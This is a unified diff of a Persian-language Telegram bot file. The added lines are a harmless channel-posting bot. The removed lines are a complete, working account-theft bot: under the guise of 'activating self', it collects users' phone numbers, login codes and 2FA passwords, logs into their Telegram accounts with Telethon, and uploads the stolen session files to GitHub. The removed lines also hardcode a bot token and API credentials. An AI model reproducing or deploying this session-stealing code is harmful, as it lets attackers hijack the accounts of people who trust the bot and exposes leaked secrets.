@@ -1,285 +1,433 @@
-import re
+# bot.py
 import os
-import base64
-import requests
 import logging
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, FloodWaitError, PhoneCodeInvalidError
+import sqlite3
+from datetime import datetime
+from typing import Dict, Optional
 
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    filters,
+    ContextTypes,
+)
+from telegram.constants import ChatType
+from telegram.error import TelegramError
+
+# -------------------- Logging Setup --------------------
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"
-API_ID = 34855392
-API_HASH = "5e40d435847009c31c24042e2a3c0d3b"
+# -------------------- Configuration --------------------
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+if not BOT_TOKEN:
+    raise ValueError("BOT_TOKEN environment variable not set!")
 
-GITHUB_TOKEN = "گیت هب توکن"
-GITHUB_OWNER = "مچوم"
-GITHUB_REPO = "اع کونی"
-GITHUB_BRANCH = "چی"
+CHANNEL_USERNAME = "@BI_GH_AM"
+CHANNEL_ID = CHANNEL_USERNAME  # Works with username format for API calls
 
-user_sessions = {}
+# -------------------- Database Setup --------------------
+DB_PATH = "bot_data.db"
 
-def create_telethon_client(session_name):
-    return TelegramClient(
-        session_name,
-        API_ID,
-        API_HASH,
-        device_model="Windows 11 Pro",
-        system_version="10.0.22621",
-        app_version="4.8.4",
-        lang_code="en",
-        system_lang_code="en-US"
+def init_db():
+    """Initialize SQLite database with required tables."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    
+    # Table to store user authorization status
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            is_authorized BOOLEAN DEFAULT 0,
+            first_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    # Table to store messages for callback data
+    c.execute('''
+        CREATE TABLE IF NOT EXISTS messages (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            message_id INTEGER,
+            user_id INTEGER,
+            original_text TEXT,
+            channel_message_id INTEGER,
+            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+
+def get_user(user_id: int) -> Optional[Dict]:
+    """Get user record from database."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT user_id, is_authorized FROM users WHERE user_id = ?", (user_id,))
+    row = c.fetchone()
+    conn.close()
+    if row:
+        return {"user_id": row[0], "is_authorized": bool(row[1])}
+    return None
+
+def create_or_update_user(user_id: int, is_authorized: bool = False) -> None:
+    """Create or update user in database."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO users (user_id, is_authorized) VALUES (?, ?) "
+        "ON CONFLICT(user_id) DO UPDATE SET is_authorized = excluded.is_authorized",
+        (user_id, is_authorized)
     )
+    conn.commit()
+    conn.close()
 
-async def upload_to_github(file_path, user_id):
+def save_message(message_id: int, user_id: int, original_text: str, channel_message_id: int) -> int:
+    """Save message mapping and return its database ID."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute(
+        "INSERT INTO messages (message_id, user_id, original_text, channel_message_id) "
+        "VALUES (?, ?, ?, ?)",
+        (message_id, user_id, original_text, channel_message_id)
+    )
+    db_id = c.lastrowid
+    conn.commit()
+    conn.close()
+    return db_id
+
+def get_original_text(db_id: int) -> Optional[str]:
+    """Retrieve original text by database ID."""
+    conn = sqlite3.connect(DB_PATH)
+    c = conn.cursor()
+    c.execute("SELECT original_text FROM messages WHERE id = ?", (db_id,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else None
+
+# -------------------- Helper Functions --------------------
+async def check_bot_admin_status(context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """Check if the bot is an administrator in the channel."""
     try:
-        with open(file_path, 'rb') as f:
-            content = base64.b64encode(f.read()).decode('utf-8')
-        filename = os.path.basename(file_path)
-        github_path = f"sessions/{filename}"
-        url = f"https://api.github.com/repos/{GITHUB_OWNER}/{GITHUB_REPO}/contents/{github_path}"
-        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
-        data = {"message": f"Add session for user {user_id}", "content": content, "branch": GITHUB_BRANCH}
-        response = requests.put(url, headers=headers, json=data)
-        return response.status_code in [200, 201]
-    except Exception as e:
-        logger.error(f"GitHub upload error: {e}")
+        bot_member = await context.bot.get_chat_member(
+            chat_id=CHANNEL_ID,
+            user_id=context.bot.id
+        )
+        return bot_member.status in ['administrator', 'creator']
+    except TelegramError as e:
+        logger.error(f"Error checking bot admin status: {e}")
         return False
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    await show_main_menu(update, context)
+async def is_user_authorized(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
+    """Check if user is authorized to post messages."""
+    # First check if bot is admin in channel
+    if not await check_bot_admin_status(context):
+        return False
+    
+    # Then check user's authorization status
+    user = get_user(user_id)
+    return user and user["is_authorized"]
 
-async def show_main_menu(update, context, edit=False):
-    keyboard = [
-        [InlineKeyboardButton("🚀 فعال سازی سلف", callback_data="activate_self")],
-        [InlineKeyboardButton("❓ سلف چیست", callback_data="what_is_self")],
-        [InlineKeyboardButton("📞 پشتیبانی", callback_data="support")]
-    ]
-    text = "👋 به ربات خوش آمدید!"
-    if edit and hasattr(update, 'callback_query'):
-        await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
-    else:
-        msg = await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
-        context.user_data['main_msg_id'] = msg.message_id
-
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    query = update.callback_query
-    await query.answer()
-    user_id = query.from_user.id
-
-    if query.data == "activate_self":
-        msg = await context.bot.send_message(
-            chat_id=user_id,
-            text="📱 لطفاً شماره موبایل را با کد کشور ارسال کنید.\nمثال: +989123456789\n🌍 همه کشورها پشتیبانی می‌شوند.",
-            parse_mode="Markdown"
+async def send_channel_message(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str) -> int:
+    """Send a message to the channel with inline button."""
+    # Channel header
+    channel_header = (
+        "VIP ALI\n"
+        "VIP BI GHAM\n"
+        "@BI_GH_AM\n\n"
+    )
+    
+    full_text = channel_header + text
+    
+    # Create inline keyboard with callback data
+    keyboard = [[
+        InlineKeyboardButton(
+            "👁 نمایش متن",
+            callback_data=f"show_{update.effective_user.id}_{datetime.now().timestamp()}"
         )
-        context.user_data['state'] = "PHONE"
-        context.user_data['last_msg_id'] = msg.message_id
-        await query.edit_message_text("⏳ در حال دریافت شماره...")
-        return
-
-    elif query.data == "what_is_self":
-        await query.edit_message_text(
-            "🔍 سشن چیست؟\n\nفایل سشن کلید ورود به حساب شماست.\nقابلیت‌ها: ذخیره ارز، ماشین حساب، مدیریت دشمنان، حالت سکوت، ساعت و ...\n⚠️ بسیار مهم و محرمانه!",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 بازگشت", callback_data="back_to_main")]])
-        )
-        return
-
-    elif query.data == "support":
-        await query.edit_message_text(
-            "📞 پشتیبانی:",
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📩 ارسال پیام", url="https://t.me/dic580")]])
-        )
-        return
-
-    elif query.data == "back_to_main":
-        await show_main_menu(update, context, edit=True)
-
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    state = context.user_data.get('state')
-    logger.info(f"User {user_id} state: {state}, message: {update.message.text}")
-
-    if state == "PHONE":
-        await receive_phone(update, context)
-    elif state == "CODE":
-        await receive_code(update, context)
-    elif state == "PASSWORD":
-        await receive_password(update, context)
-    else:
-        await update.message.reply_text("لطفاً ابتدا /start را بزنید.")
-
-async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    phone = update.message.text.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
-    logger.info(f"Processing phone: {phone} for user {user_id}")
-
-    if not phone.startswith('+') or not phone[1:].isdigit():
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="❌ شماره باید با + شروع شود.\nمثال: +989123456789\nدوباره ارسال کن:",
-            parse_mode="Markdown"
-        )
-        return
-
-    session_path = f"sessions/{user_id}_session"
-    client = create_telethon_client(session_path)
-
+    ]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # Send message to channel
     try:
-        await client.connect()
-        await client.send_code_request(phone)
-        user_sessions[user_id] = {"client": client, "phone": phone, "session_path": session_path}
-
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="✅ کد تایید ارسال شد.\n"
-                 "لطفاً کد ۵ رقمی را به فرمت زیر ارسال کن:\n"
-                 "0.0.0.0.0 (با نقطه بین هر رقم)\n\n"
-                 "❗️ همچنین می‌تونی به شکل‌های دیگه بفرستی:\n"
-                 "12345 یا 1 2 3 4 5",
-            parse_mode="Markdown"
+        channel_msg = await context.bot.send_message(
+            chat_id=CHANNEL_ID,
+            text=full_text,
+            reply_markup=reply_markup
         )
-        context.user_data['state'] = "CODE"
-        await update.message.delete()
-    except PhoneNumberInvalidError:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="❌ شماره نامعتبر است. دوباره ارسال کن:"
-        )
-    except FloodWaitError as e:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text=f"⏳ صبر کن {e.seconds} ثانیه."
-        )
-    except Exception as e:
-        logger.error(f"Error in receive_phone: {str(e)}")
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text=f"❌ خطا: {str(e)}\nدوباره شماره رو ارسال کن:"
-        )
+        return channel_msg.message_id
+    except TelegramError as e:
+        logger.error(f"Error sending message to channel: {e}")
+        raise
 
-async def receive_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    raw = update.message.text.strip()
-    clean = re.sub(r'\D', '', raw)
+# -------------------- Handlers --------------------
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /start command."""
+    user = update.effective_user
+    user_id = user.id
+    
+    # Create or get user
+    create_or_update_user(user_id, False)
+    
+    welcome_text = (
+        f"👋 سلام {user.first_name}!\n\n"
+        "به ربات پست‌گذار کانال خوش آمدید.\n"
+        "برای استفاده از این ربات، ابتدا باید ربات را در کانال ادمین کنید.\n\n"
+        "کانال: @BI_GH_AM"
+    )
+    
+    keyboard = [[
+        InlineKeyboardButton("✅ ربات را ادمین کردم", callback_data="check_admin")
+    ]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    await update.message.reply_text(
+        welcome_text,
+        reply_markup=reply_markup
+    )
 
-    if len(clean) != 5:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="❌ کد باید ۵ رقم باشد. به فرمت 0.0.0.0.0 ارسال کن:",
-            parse_mode="Markdown"
-        )
-        return
-
-    if user_id not in user_sessions:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="لطفاً دوباره /start کن."
-        )
-        context.user_data.clear()
-        return
-
-    data = user_sessions[user_id]
-    client = data["client"]
-
-    try:
-        await client.sign_in(data["phone"], clean)
-        session_file = f"{data['session_path']}.session"
-        await upload_to_github(session_file, user_id)
-
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="✅ سلف شما تا ۵ دقیقه دیگه روشن میشه!\nلطفاً صبر کنید...",
-            parse_mode="Markdown"
-        )
-        await client.disconnect()
-        del user_sessions[user_id]
-        context.user_data.clear()
-        await update.message.delete()
-    except SessionPasswordNeededError:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="🔐 رمز دوم (۲FA) دارد.\nلطفاً رمز عبور را وارد کن:"
-        )
-        context.user_data['state'] = "PASSWORD"
-        await update.message.delete()
-    except Exception as e:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text=f"❌ {str(e)}\nدوباره کد رو ارسال کن:"
-        )
-
-async def receive_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    password = update.message.text.strip()
-
-    if user_id not in user_sessions:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="لطفاً دوباره /start کن."
-        )
-        context.user_data.clear()
-        return
-
-    data = user_sessions[user_id]
-    client = data["client"]
-
-    try:
-        await client.sign_in(password=password)
-        session_file = f"{data['session_path']}.session"
-        await upload_to_github(session_file, user_id)
-
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text="✅ سلف شما تا ۵ دقیقه دیگه روشن میشه!\nلطفاً صبر کنید...",
-            parse_mode="Markdown"
-        )
-        await client.disconnect()
-        del user_sessions[user_id]
-        context.user_data.clear()
-        await update.message.delete()
-    except Exception as e:
-        await context.bot.edit_message_text(
-            chat_id=user_id,
-            message_id=context.user_data['last_msg_id'],
-            text=f"❌ {str(e)}\nدوباره رمز رو وارد کن:"
-        )
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = update.effective_user.id
-    if user_id in user_sessions:
-        await user_sessions[user_id]["client"].disconnect()
-        del user_sessions[user_id]
+async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle /cancel command."""
+    await update.message.reply_text(
+        "❌ عملیات لغو شد.\n"
+        "برای شروع مجدد از /start استفاده کنید."
+    )
+    # Clear any user data if needed
     context.user_data.clear()
-    await update.message.reply_text("❌ لغو شد.")
 
-def main():
-    if not os.path.exists("sessions"):
-        os.makedirs("sessions")
+async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle all callback queries."""
+    query = update.callback_query
+    await query.answer()  # Always answer callback to avoid timeout
+    
+    user_id = update.effective_user.id
+    
+    # Handle "check_admin" callback
+    if query.data == "check_admin":
+        await handle_check_admin(update, context)
+        return
+    
+    # Handle "show_text" callback
+    if query.data.startswith("show_"):
+        await handle_show_text(update, context)
+        return
+    
+    # Handle "retry" callback
+    if query.data == "retry":
+        await handle_retry(update, context)
+        return
+    
+    # Handle "cancel" callback
+    if query.data == "cancel_operation":
+        await handle_cancel(update, context)
+        return
+    
+    # Unknown callback
+    await query.edit_message_text("❌ دستور نامعتبر.")
 
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("cancel", cancel))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+async def handle_check_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle checking if bot is admin in channel."""
+    query = update.callback_query
+    user_id = update.effective_user.id
+    
+    # Check if bot is admin
+    is_admin = await check_bot_admin_status(context)
+    
+    if is_admin:
+        # Update user as authorized
+        create_or_update_user(user_id, True)
+        
+        await query.edit_message_text(
+            "✅ ربات با موفقیت ادمین شد.\n"
+            "حالا متن موردنظر خود را ارسال کنید."
+        )
+    else:
+        # Create retry button
+        keyboard = [[
+            InlineKeyboardButton("🔄 بررسی مجدد", callback_data="retry")
+        ]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            "❌ هنوز ربات را ادمین نکرده‌اید.\n"
+            "ابتدا ربات را در کانال ادمین کنید و دوباره روی دکمه بزنید.",
+            reply_markup=reply_markup
+        )
 
-    print("✅ ربات روشن شد...")
-    app.run_polling()
+async def handle_retry(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle retry button click."""
+    query = update.callback_query
+    user_id = update.effective_user.id
+    
+    # Check if bot is admin
+    is_admin = await check_bot_admin_status(context)
+    
+    if is_admin:
+        # Update user as authorized
+        create_or_update_user(user_id, True)
+        
+        await query.edit_message_text(
+            "✅ ربات با موفقیت ادمین شد.\n"
+            "حالا متن موردنظر خود را ارسال کنید."
+        )
+    else:
+        await query.edit_message_text(
+            "❌ همچنان ربات ادمین نیست.\n"
+            "لطفاً ابتدا ربات را در کانال ادمین کنید."
+        )
+
+async def handle_show_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle showing original text when button is clicked."""
+    query = update.callback_query
+    callback_data = query.data
+    
+    try:
+        # Extract database ID from callback data
+        # Format: show_{user_id}_{timestamp}
+        parts = callback_data.split('_')
+        if len(parts) < 3:
+            await query.answer("❌ داده نامعتبر.", show_alert=True)
+            return
+        
+        # We'll use the timestamp to find the message
+        # For simplicity, we'll search by user_id and latest message
+        # In production, you'd want to store the mapping properly
+        
+        user_id = int(parts[1])
+        
+        # Get the original text from database
+        # For this simple implementation, we'll get the latest message from this user
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute(
+            "SELECT original_text FROM messages WHERE user_id = ? ORDER BY id DESC LIMIT 1",
+            (user_id,)
+        )
+        row = c.fetchone()
+        conn.close()
+        
+        if row and row[0]:
+            await query.answer(f"📝 متن اصلی:\n\n{row[0]}", show_alert=True)
+        else:
+            await query.answer("❌ متن یافت نشد.", show_alert=True)
+            
+    except (ValueError, IndexError) as e:
+        logger.error(f"Error parsing callback data: {e}")
+        await query.answer("❌ خطا در نمایش متن.", show_alert=True)
+
+async def handle_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle cancel button from inline keyboard."""
+    query = update.callback_query
+    await query.edit_message_text(
+        "❌ عملیات لغو شد.\n"
+        "برای شروع مجدد از /start استفاده کنید."
+    )
+
+async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle text messages from users."""
+    user_id = update.effective_user.id
+    text = update.message.text
+    
+    # Check if user is authorized
+    if not await is_user_authorized(user_id, context):
+        # Check if bot is admin
+        if not await check_bot_admin_status(context):
+            keyboard = [[
+                InlineKeyboardButton("✅ ربات را ادمین کردم", callback_data="check_admin")
+            ]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text(
+                "❌ ربات در کانال ادمین نیست.\n"
+                "لطفاً ابتدا ربات را در کانال ادمین کنید.",
+                reply_markup=reply_markup
+            )
+        else:
+            # User not authorized
+            keyboard = [[
+                InlineKeyboardButton("✅ ربات را ادمین کردم", callback_data="check_admin")
+            ]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text(
+                "❌ شما هنوز تأیید نشده‌اید.\n"
+                "لطفاً روی دکمه زیر کلیک کنید تا دسترسی شما تأیید شود:",
+                reply_markup=reply_markup
+            )
+        return
+    
+    try:
+        # Send message to channel
+        channel_msg_id = await send_channel_message(update, context, text)
+        
+        # Save message mapping
+        save_message(
+            message_id=update.message.message_id,
+            user_id=user_id,
+            original_text=text,
+            channel_message_id=channel_msg_id
+        )
+        
+        await update.message.reply_text(
+            "✅ متن شما با موفقیت در کانال منتشر شد.\n"
+            "برای ارسال متن جدید، کافیست متن را ارسال کنید."
+        )
+        
+    except TelegramError as e:
+        logger.error(f"Error sending message: {e}")
+        await update.message.reply_text(
+            f"❌ خطا در ارسال پیام به کانال: {str(e)}"
+        )
+
+async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle non-text messages (photos, videos, etc.)."""
+    await update.message.reply_text(
+        "❌ لطفاً فقط متن ارسال کنید.\n"
+        "ربات فعلاً فقط از ارسال متن پشتیبانی می‌کند."
+    )
+
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle errors in the bot."""
+    logger.error(f"Update {update} caused error {context.error}")
+    
+    try:
+        if update and update.effective_message:
+            await update.effective_message.reply_text(
+                "⚠️ خطایی رخ داد. لطفاً دوباره تلاش کنید."
+            )
+    except Exception:
+        pass
+
+# -------------------- Main Application --------------------
+def main() -> None:
+    """Start the bot."""
+    # Initialize database
+    init_db()
+    logger.info("Database initialized.")
+    
+    # Create application
+    application = Application.builder().token(BOT_TOKEN).build()
+    
+    # Add command handlers
+    application.add_handler(CommandHandler("start", start_command))
+    application.add_handler(CommandHandler("cancel", cancel_command))
+    
+    # Add callback query handler
+    application.add_handler(CallbackQueryHandler(button_callback))
+    
+    # Add message handlers
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
+    application.add_handler(MessageHandler(~filters.TEXT & ~filters.COMMAND, handle_unknown_message))
+    
+    # Add error handler
+    application.add_error_handler(error_handler)
+    
+    # Start bot
+    logger.info("Starting bot...")
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
